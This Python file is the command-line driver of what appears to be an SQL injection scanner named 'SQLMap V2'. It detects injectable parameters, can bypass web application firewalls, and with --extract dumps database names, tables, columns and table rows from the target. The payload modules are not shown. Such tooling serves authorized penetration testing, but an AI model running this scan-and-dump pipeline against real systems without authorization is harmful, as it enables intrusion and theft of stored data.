# main.py
import argparse
import sys
import time
from scanner.injector import SQLiInjector
from utils.request_handler import RequestHandler
from utils.logger import Logger
from scanner.payloads import PayloadGenerator
from analyzer.response_analyzer import ResponseAnalyzer
from exploiter.extractor import DataExtractor
from utils.report_generator import ReportGenerator

def main():
    parser = argparse.ArgumentParser(
        description="SQLMap V2 - Professional SQL Injection Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --url "http://target.com/search?q=test" --method GET
  python main.py --url "http://target.com/login" --method POST --data "user=admin&pass=test"
  python main.py --url "http://target.com/api" --method POST --json --data '{"id":1}'
  python main.py --url "http://target.com" --proxy "http://127.0.0.1:8080" --export-json

DISCLAIMER: This tool is for authorized security testing ONLY. Unauthorized access is illegal.
        """
    )
    
    # Target configuration
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--data", help="POST data or JSON body")
    parser.add_argument("--json", action="store_true", help="POST data is JSON")
    parser.add_argument("--headers", nargs="*", help="Custom headers (e.g., User-Agent:Mozilla/5.0)")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--proxy", help="Proxy URL (http://127.0.0.1:8080)")
    
    # Scanning options
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--retries", type=int, default=2, help="Number of retries per request")
    parser.add_argument("--waf-bypass", action="store_true", help="Enable WAF bypass techniques")
    
    # Detection options
    parser.add_argument("--technique", choices=["all", "error", "boolean", "time", "union"],
                       default="all", help="SQLi detection technique")
    parser.add_argument("--delay", type=int, default=5, help="SLEEP delay for time-based (seconds)")
    parser.add_argument("--threshold", type=float, default=3.0, help="Time-based threshold (seconds)")
    
    # Exploitation options
    parser.add_argument("--extract", action="store_true", help="Extract databases after discovery")
    parser.add_argument("--db", help="Target specific database")
    parser.add_argument("--table", help="Target specific table")
    parser.add_argument("--dump-limit", type=int, default=10, help="Rows to dump from table")
    parser.add_argument("--injection-type", choices=["union", "blind"], default="union",
                       help="Data extraction method")
    
    # Output options
    parser.add_argument("--export-json", help="Export report as JSON (filename)")
    parser.add_argument("--export-html", help="Export report as HTML (filename)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--log-file", default="sqlmap_v2.log", help="Log file path")
    
    args = parser.parse_args()
    
    # Initialize logger
    logger = Logger(args.log_file)
    if args.verbose:
        logger.logger.setLevel(10)  # DEBUG level
    
    logger.info("="*60)
    logger.info("SQLMap V2.0 - Professional SQL Injection Testing Tool")
    logger.info("="*60)
    logger.info(f"Target: {args.url}")
    logger.info(f"Method: {args.method}")
    
    # Parse headers
    headers = {}
    if args.headers:
        for header in args.headers:
            if ":" in header:
                key, value = header.split(":", 1)
                headers[key.strip()] = value.strip()
    
    if args.cookie:
        headers["Cookie"] = args.cookie
    
    # Prepare POST data
    data = args.data
    if args.json and data:
        headers["Content-Type"] = "application/json"
    
    # Initialize components
    request_handler = RequestHandler(proxy=args.proxy, timeout=args.timeout, retry_count=args.retries)
    response_analyzer = ResponseAnalyzer()
    payload_gen = PayloadGenerator()
    injector = SQLiInjector(request_handler, response_analyzer, payload_gen, max_workers=args.threads)
    extractor = DataExtractor(request_handler, response_analyzer)
    
    # Initialize report generator
    report = ReportGenerator()
    report.add_scan_info(args.url, args.method)
    
    try:
        # Print banner
        print("\n" + "█"*60)
        print("█ SQLMap V2.0 - SQL Injection Scanner")
        print("█ Target: " + args.url)
        print("█"*60 + "\n")
        
        # Start scanning
        start_time = time.time()
        vulnerabilities = injector.scan(args.url, args.method, data, headers)
        scan_duration = time.time() - start_time
        
        # Add to report
        for vuln in vulnerabilities:
            report.add_vulnerability(
                vuln["parameter"],
                vuln["type"],
                vuln["payload"],
                vuln.get("confidence", 0),
                vuln.get("dbms", "unknown"),
                vuln.get("details", {})
            )
        
        # Display results
        if vulnerabilities:
            print(f"\n✓ VULNERABILITIES FOUND: {len(vulnerabilities)}\n")
            for i, vuln in enumerate(vulnerabilities, 1):
                confidence_pct = f"{vuln.get('confidence', 0)*100:.1f}%"
                print(f"  [{i}] Parameter: {vuln['parameter']}")
                print(f"      Type: {vuln['type']}")
                print(f"      Confidence: {confidence_pct}")
                print(f"      Injection Point: {vuln.get('injection_point', 'unknown')}")
        else:
            print("✗ No vulnerabilities detected during scan")
        
        # Data extraction if vulnerabilities found and --extract flag
        if vulnerabilities and args.extract:
            print("\n" + "-"*60)
            print("Starting data extraction...")
            print("-"*60 + "\n")
            
            # Use first vulnerable parameter for extraction
            vuln_param = vulnerabilities[0]["parameter"]
            
            # Determine injection type
            injection_type = args.injection_type
            if "blind" in vulnerabilities[0]["type"]:
                injection_type = "blind"
            elif "UNION" in vulnerabilities[0]["type"]:
                injection_type = "union"
            
            try:
                # Extract databases
                databases = extractor.extract_databases(
                    args.url, vuln_param, args.method, data, headers,
                    injection_type=injection_type
                )
                
                if databases:
                    report.add_databases(databases)
                    print(f"\n✓ Extracted {len(databases)} databases")
                    
                    # Extract tables from target database
                    target_db = args.db or (databases[0] if databases else None)
                    
                    if target_db and target_db not in ["information_schema", "mysql", "sys"]:
                        tables = extractor.extract_tables(
                            args.url, vuln_param, target_db, args.method, data, headers,
                            dbms=extractor.detected_dbms, injection_type=injection_type
                        )
                        
                        if tables:
                            print(f"✓ Extracted {len(tables)} tables from {target_db}")
                            
                            # Dump target table
                            target_table = args.table or (tables[0] if tables else None)
                            
                            if target_table:
                                columns = extractor.extract_columns(
                                    args.url, vuln_param, target_db, target_table,
                                    args.method, data, headers, dbms=extractor.detected_dbms,
                                    injection_type=injection_type
                                )
                                
                                if columns:
                                    rows = extractor.dump_table(
                                        args.url, vuln_param, target_db, target_table,
                                        columns, args.method, data, headers,
                                        dbms=extractor.detected_dbms, injection_type=injection_type,
                                        limit=args.dump_limit
                                    )
                                    
                                    if rows:
                                        report.add_data_dump(target_db, target_table, columns, rows)
                                        print(f"✓ Dumped {len(rows)} rows from {target_db}.{target_table}")
                                        
                                        # Print sample data
                                        print(f"\n  Columns: {', '.join(columns)}")
                                        for i, row in enumerate(rows[:5], 1):
                                            print(f"  Row {i}: {row}")
                                        if len(rows) > 5:
                                            print(f"  ... and {len(rows)-5} more rows")
                
            except Exception as e:
                logger.error(f"Data extraction failed: {str(e)}")
                print(f"✗ Data extraction failed: {str(e)}")
        
        # Generate report
        total_params = 0  # Would need to track this in real scan
        report.set_statistics(total_params, scan_duration)
        
        if args.export_json:
            json_file = report.export_json(args.export_json)
            print(f"\n✓ JSON report exported to: {json_file}")
        
        if args.export_html:
            html_file = report.export_html(args.export_html)
            print(f"✓ HTML report exported to: {html_file}")
        
        # Print summary
        report.print_summary()
        
        # Exit code
        sys.exit(0 if vulnerabilities else 1)
        
    except KeyboardInterrupt:
        print("\n\n⚠ Scan interrupted by user")
        logger.info("Scan interrupted by user")
        sys.exit(130)
    except Exception as e:
        logger.critical(f"FATAL ERROR: {str(e)}")
        print(f"\n✗ Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()